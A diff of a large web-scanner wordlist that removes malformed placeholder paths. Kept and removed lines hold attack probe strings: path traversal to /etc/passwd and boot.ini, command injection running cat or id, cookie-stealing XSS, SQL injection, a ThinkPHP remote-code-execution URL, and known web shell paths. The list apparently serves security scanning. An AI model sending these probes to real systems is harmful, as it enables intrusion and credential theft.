@@ -14662,13 +14542,6 @@ ZendServer/Directives/Save/extension/WmVuZCBPcHRpbWl6ZXIr
 ZendServer/Job-Queue-Scheduling/Save-Rule
 ZendServer/Page-Cache/Save-Rule
 Zip/divers.php
-[/sideboxes/counter.php
-[/sideboxes/lastvisit.php
-[/upload.php
-[index.php
-[iptbb/index.php
-[lizge/index.php
-[phcdownload/search.php
 __lib/html_form/colour_picker.php
 __swift/thirdparty/PHPExcel/PHPExcel/Shared/JAMA/docs/download.php
 _acp/templates/inc.header.php
@@ -14691,7 +14564,6 @@ _connect.php
 _database/forumFips.mdb
 _editor.php
 _fipsdb/db.mdb
-_images/[image_id].php
 _inc/bridges/php-local/index.php
 _inc/footer.php
 _inc/header.php
@@ -14724,7 +14596,6 @@ _plugin/subscriber/inc/post.php
 _private/CARateMySite.mdb
 _private/discussion.mdb
 _rights.php
-_s_/dyn/Log_highlight?href=../../../../windows/win.ini&n=1#selected
 _s_/dyn/Script_view?script=
 _s_/dyn/pro/EditorUI_saveScript
 _sys/_ext/module/chat/default/q/user.php
@@ -16235,7 +16106,6 @@ ajax-files/followBoard.php
 ajax-files/list_photo.php
 ajax-files/postComment.php
 ajax.php                                    
-ajax.php?page=include/ajax/delete_item_general&delete_item=1&name=delete_user&id=[ID])
 ajax/ajax_getBrands.asp
 ajax/ajax_optInventory.asp
 ajax/commonAjax.php
@@ -16601,7 +16471,6 @@ article_script.php
 article_script/view.php
 article_view_photo.php
 articlefr/dashboard/videouploader.php
-articlefr2/dashboard/videos/[String_Random].php
 articlems_2_1_2/install/index.php
 articlenav.php
 articles.php
@@ -16765,7 +16634,6 @@ auth_func.php
 authentication/logon.html
 author.asp
 author.php
-authorphoto/user_name[id].php
 authorphoto/zorlu40.php
 authors.php
 auto_check_renewals.php
@@ -16788,7 +16656,6 @@ aux.cfm
 available-plugins.jsp
 available_seat.php
 avatar.php
-avatars/.php.php[
 avatars/suntzu.php
 avctalert.php
 aviso.php
@@ -17785,7 +17652,6 @@ cgi-bin/logs.cgi/firewalllogport.dat
 cgi-bin/logs.cgi/log.dat
 cgi-bin/logs.cgi/proxylog.dat
 cgi-bin/lshop.cgi
-cgi-bin/lsindex2.bat|dir%20c:\[dir]
 cgi-bin/luci/
 cgi-bin/luci/;stok=<home-stok_value>/admin/ping
 cgi-bin/luci/;stok=<homeuser-stok_value>/admin/config_export
@@ -18518,7 +18384,6 @@ comment_add.asp
 comment_add_cgi.php
 comment_pics.php
 commentaires.php
-commentics/commentics/comments/[admin/index.php
 commentics/commentics/comments/admin/index.php
 comments-display-tpl.php
 comments.asp
@@ -19638,7 +19503,6 @@ describe.php
 description.php
 designer.php
 designview.php
-desk#Form/Asset%20Repair/ARLOG-000015
 deskpro_v1/faq.php
 deskpro_v1/view.php
 destek/admin/a_login.php
@@ -19809,7 +19673,6 @@ docs/showtemp.cfm
 docs_manage.php   
 docs_upload.php                             
 docsppim/notes.php
-doctor/doc_images/[FILE].php
 doctor/profile.php
 docu/goto.php
 document/demodb/-1:-1
@@ -20432,7 +20295,6 @@ exit.php
 exp/am4ss/misc.php
 exp/tanklogger/showInfo.php
 expert_wizard.php
-exploits/1755'],
 explorer.php
 explorer_wse/detail.exe
 explorer_wse/favorites.exe
@@ -20616,7 +20478,6 @@ festos/performanceschedule.php
 festos/sponsors.php
 festos/winners.php
 fetch.php
-fetch.php/D=[base64_result]
 fetchmailprefs.php
 fetchsettings.php
 ffgb_admin.php
@@ -21064,7 +20925,6 @@ fstyles.php
 ft/index.php
 ftag.php
 ftpfeature.php
-ftplogin/[user]/ftp_index.php
 ftplogin/root/ftp_index.php
 fttss/TFLivre.php
 fuck/Upload/calendar.php
@@ -21651,7 +21511,6 @@ homepg/login.php
 horde-3.3.5/admin/cmdshell.php
 horde-3.3.5/admin/phpshell.php
 horde-3.3.5/admin/sqlshell.php
-horde/[Horde_App]/login.php
 horde/imp/search.php
 horde/ingo/basic.php
 horde/kronolith/addevent.php
@@ -22597,7 +22456,6 @@ index.phpcommedia
 index.pl
 index.shtm
 index.tpl
-index/[GED_File]_conf.php
 index/index.php
 index/manager/fileUpload
 index02.php
@@ -23150,7 +23008,6 @@ kmitag/search.php
 kmrs/exportmanager/ajax/getfiles?f=/../../../../../../../../../../proc/version
 kn.php
 knowledgebase.php
-koha/opac-main.pl]
 kolang.php
 kommentar.php
 kontakt.php
@@ -23517,7 +23374,6 @@ light/cp_upload_image.php
 light/images/shell.php
 lightblog/cp_preview.php
 lilac/autodiscovery.php
-lildbi/e/admin/files/[name].php
 lildbi/e/admin/uploader.php
 limbophp.pl
 limesurvey/admin/importsurvey.php
@@ -25638,7 +25494,6 @@ pages.php?id=2%27%20AND%20(SELECT%204588%20FROM(SELECT%20COUNT(*),CONCAT(0x3a3a,
 pages.php?title=privacy-policy&id=2
 pages/Admin/File%20Editor/actions/modify.php
 pages/UI.php
-pages/[shell.php].
 pages/admin/index.php
 pages/ajax.render.php
 pages/cart/webscr.php
@@ -26099,7 +25954,6 @@ phpcart.php
 phpcart/
 phpcharts/wizard/index.php
 phpchat/canned_opr.php
-phpchat]
 phpcityportal/profile.php
 phpcksec.php
 phpclassifieds/admin/backup/
@@ -26319,7 +26173,6 @@ phpmyfamily/styles/
 phpmyfaq
 phpmyfaq/admin/
 phpmyfaq/admin/index.php
-phpmyfaq/data/tracking[date]
 phpmynewsletter/
 phpmyring/
 phpmysport/index.php
@@ -26519,9 +26372,6 @@ plogger/plog-admin/plog-upload.php
 pls/
 pls/MSBEP004/
 pls/TEST/oracleconfigure.customize
-pls/[DADName]/icx_define_pages.DispPageDialog
-pls/[DADName]/icx_define_pages.editpagelist
-pls/[DADName]/oracleconfigure.customize
 pls/otn/f
 pls/otn/wwv_flow.accept
 pls/portal/PORTAL.wwv_main.render_warning_screen
@@ -27077,8 +26927,6 @@ profile/controlpanel.asp
 profile/profil.asp
 profile/update.asp
 profile_detail.php
-profile_pics/[FILE].php
-profile_pics/[ID_FILE].php
 profile_send.php
 profile_social.php
 profile_view.php
@@ -27173,9 +27021,7 @@ public/code/index.php
 public/error.php
 public/image/shell.php
 public/index.php
-public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-r%20'phpinfo();'
 public/modules.php
-public/music_song/1000000/[numbers]/[user_id]/[some_numbers].php
 public/page.php
 public/proxy.php
 public/s-cms/plugin.php
@@ -27799,7 +27645,6 @@ scr/soustab.php
 scrapbook.php
 scrape-external.php
 screen.php
-screens/dashboard.html#/RogueApDetail/00:00:00:00:00:00">'><img src="xxxxx">
 script-directory-software.php
 script/NEI_ModuleDispatch.php
 script/X7Chat/index.php
@@ -27810,7 +27655,6 @@ script/admin/default.asp
 script/affiliateshoppingcart.php
 script/autoresponderhosting.php
 script/blogblaster.php
-script/cars_images/[id]_logo_your_shell.php
 script/cat_for_aff.php
 script/cat_for_gen.php
 script/classifieds.php
@@ -27841,7 +27685,6 @@ script/include/header.php
 script/info.php
 script/infusions/calendar_panel/show_event.php
 script/init/createallimagecache.php
-script/jobseekers/jobseeker_profile_images/[id]_offer_your_shel.php
 script/login.php
 script/lyrics.php
 script/menu/menuprincipal.php
@@ -27849,11 +27692,9 @@ script/modules/articles/print.php
 script/pafiledb.php
 script/param/param.inc.php
 script/phpforge3/admin.php
-script/pictures/[id]your_shell.php
 script/plugins/phpgacl/admin/index.php
 script/post.php
 script/profile.php
-script/re_images/[id]_logo_your_shell.php
 script/register.php
 script/reminder.php
 script/scrollingads.php
@@ -28201,7 +28042,6 @@ servlets/FileUploadServlet?fileName=../jsp/Login.jsp
 servlets/GetChallengeServlet
 servlets/SettingsServlet
 servlets/ajax_file_upload?fieldName=binary3 
-servlets/gnujsp/[dirname]/[file]
 sess.php
 sesseisbp4bciukbenlo/filemanager/login.php
 session.cgi
@@ -30237,7 +30077,6 @@ vfront/admin/query_editor.php
 vfront/admin/variabili.php
 vgm-forbin/article.asp
 vhcs2/admin/add_user.php
-vhosts/[username]/[domain]/httpdocs/shell.php
 via-ferrata/SITE_fiche.php
 viart_shop/admin/admin_header.php
 viart_shop/includes/ajax_list_tree.php
@@ -30649,7 +30488,6 @@ webcacheadmin
 webcaf/about.php
 webcaf/index.php
 webcaf/webcaf/modules/view.php
-webcalendar/[filename].php
 webcalendar/activity_log.php
 webcalendar/layers_toggle.php
 webcalendar/login.php
@@ -31331,7 +31169,6 @@ wp-content/plugins/ungallery/source_vuln.php
 wp-content/plugins/uploader/uploadify/uploadify.php
 wp-content/plugins/uploader/views/notify.php
 wp-content/plugins/uploads/2012/06/shell.php
-wp-content/plugins/uploads/[YYYY]/[MM]/shell.php
 wp-content/plugins/upm-polls/includes/poll_logs.php
 wp-content/plugins/user-avatar/user-avatar-pic.php
 wp-content/plugins/user-meta/framework/helper/uploader.php
@@ -31535,8 +31372,6 @@ wp-content/uploads/2013/11/devilscream.php
 wp-content/uploads/2013/11/upload.php
 wp-content/uploads/2013/13/inc0vers.php
 wp-content/uploads/2015/03/backdoor.php
-wp-content/uploads/[year]/[month]/up.php
-wp-content/uploads/[years]/[month]/your_shell.php
 wp-content/uploads/assets/temp/lo.php
 wp-content/uploads/assignments/shell.php
 wp-content/uploads/contact_files/1427927588-backdoor.php
@@ -32297,7 +32132,6 @@ plugin.php?page=XmlImportExport/import
 plugin.php?page=XmlImportExport/import_action
 bug_actiongroup.php
 SGPAdmin/fileRequest
-hqu/gconsole/console/execute.hqu?org.apache.catalina.filters.CSRF_NONCE=)+@nonce
 login.spl
 admin/advertiser-campaigns.php
 administrator/components/com_joomlaupdate/restoration.php
@@ -32685,7 +32519,6 @@ cgi-bin/horde/test.php?mode=phpinfo
 cgi-bin/photo/protected/manage.cgi
 cgi-bin/wrap.cgi
 ~root/
-forums/@ADMINconfig.php
 forums/config.php
 ganglia/
 guestbook/guestbookdat
@@ -32709,7 +32542,6 @@ cgi-bin/excite;IFS=\"$\";/bin/cat
 cgi-bin/ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|
 cgi-bin/guestbook.cgi
 cgi-bin/ss
-forumdisplay.php?GLOBALS[]=1&f=2&comma=\".system('id').\"
 guestbook/guestbook.html
 html/cgi-bin/cgicso?query=AAA
 geeklog/users.php
@@ -33081,9 +32913,6 @@ examples/servlet/TroubleShooter
 cgi-bin/ans.pl?p=../../../../../usr/bin/id|&blah
 cgi-bin/ans/ans.pl?p=../../../../../usr/bin/id|&blah
 goform/CheckLogin?login=root&password=tslinux
-[SecCheck]/..%2f../ext.ini
-[SecCheck]/..%255c..%255c../ext.ini
-[SecCheck]/..%252f..%252f../ext.ini
 cgi/cfdocs/expeval/ExprCalc.cfm?OpenFilePath=c:\winnt\win.ini
 cgi/cfdocs/expeval/ExprCalc.cfm?OpenFilePath=c:\windows\win.ini
 prxdocs/misc/prxrch.idq?CiTemplate=../../../../../../../../../../winnt/win.ini
@@ -33161,8 +32990,6 @@ cgi-bin/emu/html/emumail.cgi?type=/../../../../../../../../../../../../../../../
 cgi-bin/faxsurvey?cat%20/etc/passwd
 cgi-bin/faqmanager.cgi?toc=/etc/passwd%00
 cgi-bin/ezshopper/search.cgi?user_id=id&database=dbase1.exm&template=../../../../../../../etc/passwd&distinct=1
-cgi-bin/formmail?recipient=root@localhost%0Acat%20/etc/passwd&email=joeuser@localhost&subject=test
-cgi-bin/formmail.pl?recipient=root@localhost%0Acat%20/etc/passwd&email=joeuser@localhost&subject=test
 cgi-bin/generate.cgi?content=../../../../../../../../../../winnt/win.ini%00board=board_1
 cgi-bin/generate.cgi?content=../../../../../../../../../../windows/win.ini%00board=board_1
 cgi-bin/generate.cgi?content=../../../../../../../../../../etc/passwd%00board=board_1
@@ -33245,7 +33072,6 @@ site/'
 postnuke/index.php?module=My_eGallery
 postnuke/html/index.php?module=My_eGallery
 cgi-bin/alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,
-phpwebsite/index.php?module=calendar&calendar[view]=day&year=2003%00-1&month=
 phpBB2/search.php?search_id=1\
 horde/test.php
 examples/cookie
@@ -33310,7 +33136,6 @@ cgi-bin/dansguardian.pl?DENIEDURL=</a><script>alert('Vulnerable');</script>
 cgi-bin/cgicso?query=<script>alert('Vulnerable')</script>
 cgi-bin/betsie/parserl.pl/<script>alert('Vulnerable')</script>;
 cgi-bin/auction/auction.cgi?action=Sort_Page&View=Search&Page=0&Cat_ID=&Lang=English&Search=All&Terms=<script>alert('Vulnerable');</script>&Where=&Sort=Photo&Dir=
-cgi-bin/athcgi.exe?command=showpage&script='],[0,0]];alert('Vulnerable');a=[['
 cgi-bin/.cobalt/alert/service.cgi?service=<script>alert('Vulnerable')</script>
 cgi-bin/.cobalt/alert/service.cgi?service=<img%20src=javascript:alert('Vulnerable')>
 ~/<script>alert('Vulnerable')</script>.aspx?aspxerrorpath=null
@@ -33323,7 +33148,6 @@ webamil/test.php
 users.php?mode=profile&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
 usercp.php?function=avataroptions:javascript:alert(%27Vulnerable%27)
 user.php?op=userinfo&uname=<script>alert('hi');</script>
-user.php?op=confirmnewuser&module=NS-NewUser&uname=%22%3E%3Cimg%20src=%22javascript:alert(document.cookie);%22%3E&email=test@test.com
 TopSitesdirectory/help.php?sid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
 templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script>
 supporter/index.php?t=updateticketlog&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;
@@ -33354,9 +33178,6 @@ pm_buddy_list.asp?name=A&desc=B%22%3E<script>alert('Vulnerable')</script>%3Ca%20
 pms.php?action=send&recipient=DESTINATAIRE&subject=happy&posticon=javascript:alert('Vulnerable')&mode=0&message=Hello
 pm.php?function=sendpm&to=VICTIM&subject=SUBJECT&images=javascript:alert('Vulnerable')&message=MESSAGE&submitpm=Submit
 phpwebsite/index.php?module=search&SEA_search_op=continue&PDA_limit=10\"><script>alert('Vulnerable')</script>
-phpwebsite/index.php?module=pagemaster&PAGE_user_op=view_page&PAGE_id=10\"><script>alert('Vulnerable')</script>&MMN_position=[X:X]
-phpwebsite/index.php?module=fatcat&fatcat[user]=viewCategory&fatcat_id=1%00+\"><script>alert('Vulnerable')</script>
-phpwebsite/index.php?module=calendar&calendar[view]=day&month=2&year=2003&day=1+%00\"><script>alert('Vulnerable')</script>
 phpwebchat/register.php?register=yes&username=OverG&email=<script>alert%20(\"Vulnerable\")</script>&email1=<script>alert%20(\"Vulnerable\")</script>
 phptonuke.php?filnavn=<script>alert('Vulnerable')</script>
 phprank/add.php?page=add&spass=1&name=2&siteurl=3&email=%3Cscript%3Ealert(Vulnerable)%3C/script%3E
@@ -33366,9 +33187,6 @@ phpimageview.php?pic=javascript:alert('Vulnerable')
 phpclassifieds/latestwap.php?url=<script>alert('Vulnerable');</script>
 phpBB/viewtopic.php?topic_id=<script>alert('Vulnerable')</script>
 phpBB/viewtopic.php?t=17071&highlight=\">\"<script>javascript:alert(document.cookie)</script>
-phorum/admin/header.php?GLOBALS[message]=<script>alert('Vulnerable')</script>
-phorum/admin/footer.php?GLOBALS[message]=<script>alert('Vulnerable')</script>
-pforum/edituser.php?boardid=&agree=1&username=%3Cscript%3Ealert('Vulnerable')%3C/script%3E&nickname=test&email=test@example.com&pwd=test&pwd2=test&filled=1
 pages/htmlos/%3Cscript%3Ealert('Vulnerable');%3C/script%3E
 Page/1,10966,,00.html?var=<script>alert('Vulnerable')</script>
 openautoclassifieds/friendmail.php?listing=<script>alert(document.domain);</script>
@@ -33376,8 +33194,6 @@ openautoclassifieds/friendmail.php?listing=&lt;script&gt;alert(document.domain);
 node/view/666\"><script>alert(document.domain)</script>
 netutils/whodata.stm?sitename=<script>alert(document.cookie)</script>
 nav/cList.php?root=</script><script>alert('Vulnerable')/<script>
-myphpnuke/links.php?op=search&query=[script]alert('Vulnerable);[/script]?query=
-myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent
 myhome.php?action=messages&box=<script>alert('Vulnerable')</script>
 msadm/user/login.php3?account_name=\"><script>alert('Vulnerable')</script>
 msadm/site/index.php3?authid=\"><script>alert('Vulnerable')</script>
@@ -33494,7 +33310,6 @@ cgi-bin/mt/mt.cfg
 cgi-bin-sdb/printenv
 ext.dll?MfcIsapiCommand=LoadPage&page=admin.hts%20&a0=add&a1=root&a2=%5C
 db/users.dat
-cgi-bin/cgiwrap/~@USERS
 cgi-bin/cgiwrap/~JUNK(5)
 cgi-bin/cgiwrap/~root
 cgi-bin/dbman/db.cgi?db=no-db
@@ -33554,7 +33369,6 @@ cgi-bin/csGuestBook.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
 cgi-bin/csLiveSupport.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
 cgi-bin/csNewsPro.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
 cgi-bin/echo.bat
-cgi-bin/formmail.cgi?recipient=root@localhost%0Acat%20/etc/passwd&email=joeuser@localhost&subject=test
 cgi-bin/ImageFolio/admin/admin.cgi
 cgi-bin/infosrch.cgi
 cgi-bin/listrec.pl
@@ -33565,7 +33379,6 @@ cgi-bin/perl?-v
 cgi-bin/perl.exe?-v
 cgi-bin/perl.exe
 cgi-bin/perl
-cgi-bin/scripts/slxweb.dll/getfile?type=Library&file=[invalid
 cgi-bin/smartsearch.cgi?keywords=|/bin/cat%20/etc/passwd|
 cgi-bin/smartsearch/smartsearch.cgi?keywords=|/bin/cat%20/etc/passwd|
 cgi-bin/spin_client.cgi?aaaaaaaa
@@ -33700,7 +33513,6 @@ isx.html
 //
 cgi-bin/blog/mt-check.cgi
 mailman/admin/ml-name?\"><script>alert('Vulnerable')</script>;
-mail/addressaction.html?id=<USERID#>&newaddress=1&addressname=<script>alert('Vulnerable')</script>&addressemail=junk@example.com
 webalizer/
 web/
 phpshare/phpshare.php
@@ -33716,12 +33528,9 @@ fcgi-bin/echo.exe?foo=<script>alert('Vulnerable')</script>
 fcgi-bin/echo2.exe?foo=<script>alert('Vulnerable')</script>
 blahb.ida
 blahb.idq
-ab2/\@AdminViewError
 \"><img%20src=\"javascript:alert(document.domain)\">
 Survey/Survey.Htm
 WEBAGENT/CQMGSERV/CF-SINFO.TPF
-ab2/\@AdminAddadmin?uid=foo&password=bar&re_password=bar
-ab2/Help_C/\@Ab2HelpSearch?scope=HELP&DwebQuery=<script>alert(Vulnerable)</script>
 apps/web/index.fcgi?servers=&section=<script>alert(document.cookie)</script>
 ba4.nsf
 BACLIENT
@@ -33831,7 +33640,6 @@ gallery/errors/reconfigure.php
 gallery/errors/unconfigured.php
 users.lst
 WS_FTP.LOG
-basilix.php3?request_id[DUMMY]=../../../../etc/passwd&RequestID=DUMMY&username=sec&password=secu
 examples/jsp/snp/snoop.jsp
 nsn/env.bas
 lcgi/lcgitest.nlm
@@ -33913,7 +33721,6 @@ OpenFile.aspx?file=../../../../../../../../../../boot.ini
 cgi-bin/windmail
 cgi-bin/windmail.exe
 cgi-bin/WINDMAIL.EXE?%20-n%20c:\boot.ini%
-cgi-bin/WINDMAIL.EXE?%20-n%20c:\boot.ini%20Hacker@hax0r.com%20|%20dir%20c:\
 cgi-bin/dose.pl?daily&somefile.txt&|ls|
 admin/database/wwForum.mdb
 /admin/aindex.htm
@@ -34547,7 +34354,6 @@ finance.xls
 finances.xls
 abonnement.asp
 acartpath/signin.asp?|-|0|404_Object_Not_Found
-admbrowse.php?down=1&amp;cur=%2Fetc%2F&amp;dest=passwd&amp;rid=1&amp;S=[someid]
 admin/cfg/configscreen.inc.php+
 admin/cfg/configsite.inc.php+
 admin/cfg/configsql.inc.php+
@@ -34606,17 +34412,6 @@ forum-ra_professionnel.asp?n=/.\"./.\"./.\"./.\"./.\"./boot.ini
 forum-ra_professionnel.asp?n=/etc/passwd
 forum-ra_professionnel.asp?n=/etc/passwd%00
 forum-ra_professionnel.asp?n=c:\boot.ini
-forum.asp?n=%60/etc/passwd%60|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;.
-forum.asp?n=../../../../../../../../../etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-forum.asp?n=../../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-forum.asp?n=/....../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-forum.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-forum.asp?n=/../../../../../../etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-forum.asp?n=/../../../etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-forum.asp?n=/.\"./.\"./.\"./.\"./.\"./boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-forum.asp?n=/etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-forum.asp?n=/etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-forum.asp?n=c:\boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;.
 forum/newreply.php
 forum/newthread.php
 forum1.asp?n=%60/etc/passwd%60&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.
@@ -34675,29 +34470,8 @@ forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/etc/passwd%00
 forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=c:\boot.ini
 forum1_professionnel.asp?n=1771&amp;nn=c:\boot.ini&amp;page=1
 forum1_professionnel.asp?n=c:\boot.ini&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.
-forum_arc.asp?n=%60/etc/passwd%60|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;.
-forum_arc.asp?n=../../../../../../../../../etc/passwd%00|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-forum_arc.asp?n=/....../boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-forum_arc.asp?n=/.../.../.../.../.../.../boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-forum_arc.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-forum_arc.asp?n=/../../../../../../../../etc/passwd|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-forum_arc.asp?n=/.\"./.\"./.\"./.\"./.\"./boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-forum_arc.asp?n=/etc/passwd%00|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-forum_arc.asp?n=/etc/passwd|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
 forum_arc.asp?n=268
-forum_arc.asp?n=c:\boot.ini|36|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;.
-forum_professionnel.asp?n=%60/etc/passwd%60|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;.
-forum_professionnel.asp?n=....//....//....//....//....//....//....//etc.passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-forum_professionnel.asp?n=../../../../../../../../../etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-forum_professionnel.asp?n=/....../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-forum_professionnel.asp?n=/.../.../.../.../.../.../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-forum_professionnel.asp?n=/../../../../../../../../../../../../../../../../../../../../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-forum_professionnel.asp?n=/../../../../../../../../etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-forum_professionnel.asp?n=/.\"./.\"./.\"./.\"./.\"./boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-forum_professionnel.asp?n=/etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-forum_professionnel.asp?n=/etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
 forum_professionnel.asp?n=100
-forum_professionnel.asp?n=c:\boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;.
 functions.inc.php+
 get_od_toc.pl
 globals.pl
@@ -34706,17 +34480,6 @@ helperfunction.php
 homebet/homebet.dll?form=menu&amp;option=menu-signin
 idealbb/error.asp?|-|0|404_Object_Not_Found
 iisprotect/admin/SiteAdmin.ASP?|-|0|404_Object_Not_Found
-imprimer.asp?no=%60/etc/passwd%60|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;.
-imprimer.asp?no=....//....//....//....//....//....//....//etc.passwd|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-imprimer.asp?no=../../../../../../../../../etc/passwd%00|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-imprimer.asp?no=/....../boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-imprimer.asp?no=/.../.../.../.../.../.../boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-imprimer.asp?no=/../../../../../../../../../../../../../../../../../../../../boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-imprimer.asp?no=/../../../../../../../../etc/passwd|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-imprimer.asp?no=/.\"./.\"./.\"./.\"./.\"./boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-imprimer.asp?no=/etc/passwd%00|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-imprimer.asp?no=/etc/passwd|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-imprimer.asp?no=c:\boot.ini|44|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;.
 infos/contact/index.asp
 infos/faq/index.asp
 infos/gen/index.asp
@@ -34764,23 +34527,10 @@ ProductCart/pc/msg.asp?|-|0|404_Object_Not_Found
 proplus/admin/login.php+-d+\"action=insert\"+-d+\"username=test\"+-d+\"password=test\"
 protected/
 protected/secret.html+
-protectedpage.php?uid=&#039;%20OR%20&#039;&#039;=&#039;&amp;pwd=&#039;%20OR%20&#039;&#039;=&#039;
 pt_config.inc
 pvote/add.php?question=AmIgAy&amp;o1=yes&amp;o2=yeah&amp;o3=well..yeah&amp;o4=bad%20
 pvote/del.php?pollorder=1%20
 quikmail/nph-emumail.cgi?type=../%00
